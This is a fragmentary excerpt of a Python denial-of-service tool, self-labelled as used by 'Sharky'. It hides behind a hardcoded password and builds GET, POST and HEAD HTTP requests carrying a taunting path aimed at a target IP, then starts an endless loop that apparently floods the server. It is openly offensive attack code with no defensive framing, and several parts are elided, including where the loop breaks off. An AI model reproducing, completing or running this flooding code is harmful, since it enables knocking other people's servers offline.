...
import time
import os
os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By Sharky [ What Password ]")
password = input("[ + ] Password : ")
if password == "Sharky323":
...
def Headers(method, referers=None):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Got_DDoS_By_Sharky_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
...
def run():
    ...
    if method_attack == "1":
        get_host = "GET /Your_Server_Got_DDoS_By_Sharky_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_Sharky_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
